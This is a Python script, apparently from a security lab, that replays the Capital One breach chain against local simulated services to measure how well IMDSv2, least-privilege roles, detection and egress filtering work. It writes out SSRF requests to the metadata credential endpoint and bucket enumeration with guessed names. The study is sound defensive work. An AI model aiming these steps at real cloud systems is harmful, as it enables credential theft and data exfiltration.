"""
run_experiment.py — Orchestrates the four configurations and records results.

WHAT THIS DOES
--------------
For each configuration (A/B/C/D) it stands up the simulated services in-process,
replays the Capital One attack chain against them, and records three measures:

  1. credential_theft   did Stage S2 succeed in reading role credentials?
  2. objects_reachable  how many synthetic objects could be read (blast radius)?
  3. detection          did a rule fire, and with what latency?

Everything runs against 127.0.0.1 with synthetic data. The "attack chain" here
is a fixed sequence of ordinary HTTP requests used purely to measure control
efficacy; it targets only the in-process simulator and has no function outside
it.

CONFIGURATIONS
  A  2019 baseline      IMDSv1  + wildcard role  + no detection
  B  IMDSv2 only        IMDSv2  + wildcard role  + no detection
  C  Least-privilege    IMDSv1  + scoped role    + no detection
  D  Full framework     IMDSv2  + scoped role    + detection + egress filter

Run:  python run_experiment.py
"""

import csv
import io
import json
import time
from contextlib import redirect_stderr
from dataclasses import dataclass, asdict
from pathlib import Path

from werkzeug.serving import make_server, WSGIRequestHandler
import threading
import requests
from requests.adapters import HTTPAdapter

import detector
from audit import AuditLog
from iam import Policy
from metadata_service import MetadataService, create_app as make_imds
from object_store import ObjectStore, create_app as make_s3, INSTANCE_IP

# Serve HTTP/1.1 so connections stay open (keep-alive). Without this the dev
# server closes the socket after every request; on Windows each closed socket
# lingers in TIME_WAIT and tens of thousands of object reads exhaust the
# ephemeral port range, raising WinError 10048.
WSGIRequestHandler.protocol_version = "HTTP/1.1"

LAB = Path(__file__).parent
POLICIES = LAB / "policies"
RESULTS = LAB / "results"

# The attacker drives the simulator from a host that is NOT the instance.
ATTACKER_IP = "203.0.113.66"   # TEST-NET-3, reserved for documentation use.


def make_session():
    """
    One HTTP session with a connection pool and keep-alive. Reusing connections
    (instead of opening a fresh socket per request) is what lets the runner make
    tens of thousands of localhost calls without exhausting Windows ports.
    """
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=4, pool_maxsize=8, max_retries=3)
    s.mount("http://", adapter)
    return s


class ServerThread(threading.Thread):
    """Runs a Flask app in a background thread so the runner can call it."""

    def __init__(self, app, port):
        super().__init__(daemon=True)
        self.server = make_server("127.0.0.1", port, app, threaded=True)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()


@dataclass
class ConfigResult:
    config: str
    description: str
    imds_mode: str
    role_policy: str
    credential_theft: str
    objects_reachable: int
    total_objects: int
    relative_blast_radius_pct: float
    detection: str
    detection_latency_seconds: str


def attempt_credential_theft(session, app_port, imds_port, allow_methods, egress_filter):
    """
    Stage S1+S2: use the SSRF primitive to reach the metadata service and try
    to read role credentials.

    Returns the credential dict on success, or None if the controls blocked it.
    The logic mirrors a real chain: under IMDSv2 the attacker must first obtain
    a token via PUT, but the GET-only primitive cannot, so it fails.
    """
    app = f"http://127.0.0.1:{app_port}/fetch"
    imds = f"http://127.0.0.1:{imds_port}"

    def ssrf_get(target_url, forward_headers=None):
        params = {"url": target_url, "method": "GET"}
        headers = {}
        for k, v in (forward_headers or {}).items():
            headers[f"X-Forward-{k}"] = v
        return session.get(app, params=params, headers=headers, timeout=5)

    # If the attacker had a PUT-capable primitive (RCE-grade), it would try the
    # token exchange first. With the default GET-only primitive this is blocked
    # by the app itself, so we only reach for the token when methods are open.
    token = None
    if allow_methods:
        r = session.get(app, params={
            "url": f"{imds}/latest/api/token", "method": "PUT"},
            headers={"X-Forward-X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=5)
        if r.status_code == 200:
            token = r.text.strip()

    fwd = {"X-aws-ec2-metadata-token": token} if token else None

    # First request: list the attached role name.
    r1 = ssrf_get(f"{imds}/latest/meta-data/iam/security-credentials/", fwd)
    if r1.status_code != 200 or r1.text.strip().startswith(("401", "403")):
        return None
    role = r1.text.strip()

    # Second request: retrieve the credentials themselves.
    r2 = ssrf_get(f"{imds}/latest/meta-data/iam/security-credentials/{role}", fwd)
    if r2.status_code != 200:
        return None
    try:
        return r2.json()
    except json.JSONDecodeError:
        return None


# Bucket names an attacker would try if the account-wide listing is denied.
# A scoped role blocks s3:ListAllMyBuckets, but an attacker who already knows
# or guesses a bucket name can still attempt it directly, so a faithful
# measurement must model that fallback rather than stopping at the denied list.
CANDIDATE_BUCKETS = [
    "customer-card-applications",
    "customer-credit-decisions",
    "customer-statements-archive",
    "internal-analytics-exports",
    "waf-config-bucket",
]


def measure_blast_radius(session, s3_port):
    """
    Stage S3+S4: with stolen credentials, enumerate buckets and read every
    object the policy permits. Returns the count successfully read.

    Each request carries the attacker's source IP, which is what makes the
    activity detectable and what the policy is evaluated against.
    """
    base = f"http://127.0.0.1:{s3_port}"
    hdr = {"X-Sim-Source-IP": ATTACKER_IP}
    read = 0

    # Preferred path: ask for every bucket at once. A wildcard-scoped role
    # permits this; a least-privilege role denies it.
    rb = session.get(f"{base}/", headers=hdr, timeout=5)
    if rb.status_code == 200:
        buckets = rb.json().get("Buckets", [])
    else:
        # Fallback: the account-wide list was denied, so try known names
        # directly. This is what bounds the blast radius under least privilege
        # to whatever the scoped role still permits.
        buckets = CANDIDATE_BUCKETS

    for bucket in buckets:
        rl = session.get(f"{base}/{bucket}", headers=hdr, timeout=5)
        if rl.status_code != 200:
            continue
        for key in rl.json().get("Contents", []):
            ro = session.get(f"{base}/{bucket}/{key}", headers=hdr, timeout=10)
            if ro.status_code == 200:
                read += 1
    return read


def run_config(name, description, imds_mode, policy_file,
               detection_on, egress_filter, port_base, allow_methods=False):
    audit = AuditLog()
    policy = Policy.from_file(POLICIES / policy_file)

    imds_service = MetadataService(mode=imds_mode)
    store = ObjectStore(policy, audit)

    # Distinct, deterministic port block per configuration so concurrent
    # servers never collide across the four runs.
    imds_port, app_port, s3_port = port_base, port_base + 1, port_base + 2

    from vulnerable_app import AppConfig, create_app as make_app
    app_cfg = AppConfig(f"http://127.0.0.1:{imds_port}",
                        allow_methods=allow_methods, egress_filter=egress_filter)

    servers = [
        ServerThread(make_imds(imds_service), imds_port),
        ServerThread(make_app(app_cfg), app_port),
        ServerThread(make_s3(store), s3_port),
    ]
    for s in servers:
        s.start()
    time.sleep(0.4)  # let the servers bind

    session = make_session()
    try:
        creds = attempt_credential_theft(session, app_port, imds_port,
                                         allow_methods, egress_filter)
        theft = creds is not None

        objects = measure_blast_radius(session, s3_port) if theft else 0

        # The detector is ALWAYS run over the audit log, because the central
        # lesson of 2019 is that the telemetry existed and only the rule was
        # missing. Evaluating every run shows where a rule WOULD have fired.
        # 'detection_on' records whether the config actually deploys the layer.
        det = detector.evaluate(audit.events)
        audit.write_jsonl(RESULTS / f"cloudtrail_{name}.jsonl")

        # Describe the detection outcome honestly:
        #  - theft blocked  -> no malicious S3 activity occurred, nothing to detect
        #  - theft succeeded + rule fires -> report latency
        if not theft:
            detection_text = "no intrusion to detect (blocked earlier)"
            latency_text = "n/a"
        elif det["detected"]:
            layer = "deployed" if detection_on else "would fire if deployed"
            if det["fires_on_first_call"]:
                detection_text = (f"{det['first_rule']} fires on first foreign "
                                  f"call; {det['objects_before_detection']} objects "
                                  f"read before detection [{layer}]")
                latency_text = "immediate"
            else:
                detection_text = f"detected via {det['first_rule']} [{layer}]"
                latency_text = f"{det['detection_latency_seconds']:.3f}s"
        else:
            detection_text = "not detected"
            latency_text = "n/a"

        total = store.total_objects()
        return ConfigResult(
            config=name,
            description=description,
            imds_mode=imds_mode,
            role_policy=policy_file,
            credential_theft="succeeded" if theft else "blocked",
            objects_reachable=objects,
            total_objects=total,
            relative_blast_radius_pct=round(100.0 * objects / total, 2),
            detection=detection_text,
            detection_latency_seconds=latency_text,
        )
    finally:
        session.close()
        for s in servers:
            s.stop()


def main():
    RESULTS.mkdir(exist_ok=True)
    configs = [
        ("A", "2019 baseline (IMDSv1, wildcard role, no detection)",
         "v1", "wildcard_role.json", False, False),
        ("B", "IMDSv2 enforced only",
         "v2", "wildcard_role.json", False, False),
        ("C", "Least-privilege role only (IMDSv1 retained)",
         "v1", "least_privilege.json", False, False),
        ("D", "Full four-layer framework",
         "v2", "least_privilege.json", True, True),
    ]

    results = []
    print("\n" + "=" * 74)
    print("Capital One breach — control-efficacy emulation")
    print("=" * 74)
    for i, (name, desc, mode, pol, det, egress) in enumerate(configs):
        # Each config gets its own block of three ports (8100, 8110, ...).
        port_base = 8100 + i * 10
        # Silence the dev-server banner noise per run.
        with redirect_stderr(io.StringIO()):
            res = run_config(name, desc, mode, pol, det, egress, port_base)
        results.append(res)
        print(f"\n[Config {res.config}] {res.description}")
        print(f"    IMDS mode ............. {res.imds_mode}")
        print(f"    Role policy .......... {res.role_policy}")
        print(f"    Credential theft ..... {res.credential_theft}")
        print(f"    Objects reachable .... {res.objects_reachable} / {res.total_objects}"
              f"  ({res.relative_blast_radius_pct}% of estate)")
        print(f"    Detection ............ {res.detection}"
              f"  (latency: {res.detection_latency_seconds})")

    # Write the results table the report cites.
    out = RESULTS / "results.csv"
    with out.open("w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=list(asdict(results[0]).keys()))
        writer.writeheader()
        for r in results:
            writer.writerow(asdict(r))

    print("\n" + "=" * 74)
    print(f"Results written to {out}")
    print(f"Per-config CloudTrail logs written to {RESULTS}/cloudtrail_*.jsonl")
    print("=" * 74 + "\n")


if __name__ == "__main__":
    main()